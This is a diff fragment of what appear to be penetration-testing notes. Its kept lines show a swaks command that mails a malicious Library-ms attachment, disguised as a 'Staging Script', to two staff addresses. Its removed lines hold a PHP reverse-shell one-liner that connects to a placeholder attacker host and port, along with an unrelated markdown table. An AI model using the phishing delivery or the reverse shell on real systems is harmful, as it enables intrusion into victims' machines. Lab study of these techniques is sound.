@@ -65,29 +65,3 @@ John
 ```bash
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server $mailServerIP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
-
-
-## Universal
-
-<table>
-<tr>
-<td> Status </td> <td> Response </td>
-</tr>
-<tr>
-<td> PHP </td>
-<td>
-
-```bash
-php -r '$sock=fsockopen("<hip>",<hport>);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-</td>
-</tr>
-</table>
-
-
-| Inline code | Code block                 |
-|-------------|----------------------------|
-| <pre><code>`a = 1`</code></pre>   | <pre><code>a = 1</code><br><code>b = 
-2</code></pre> |
-
